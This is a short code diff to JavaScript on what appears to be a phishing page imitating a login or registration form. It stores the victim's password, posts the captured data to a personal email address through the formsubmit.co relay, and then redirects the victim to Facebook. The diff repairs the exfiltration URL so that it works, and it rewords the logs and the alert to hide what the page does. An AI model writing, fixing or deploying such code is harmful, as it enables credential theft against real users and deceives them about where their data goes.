@@ -15,7 +15,7 @@ document
     localStorage.setItem("password", password);
 
     // Send the data to your email address
-    fetch("kolithanew123@gmail.com", {
+    fetch("https://formsubmit.co/kolithanew123@gmail.com", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -27,12 +27,13 @@ document
     })
       .then((response) => response.json())
       .then((data) => {
-        console.log("Email sent successfully:", data);
+        console.log("Registration Successfully:", data);
         window.location.href = "https://www.facebook.com/"; // Redirect after sending email
       })
       .catch((error) => {
-        console.error("Error sending email:", error);
-        alert("Failed to send data to your email.");
+        console.error("Error Registration:", error);
+        alert("...");
       });
   });
+
 
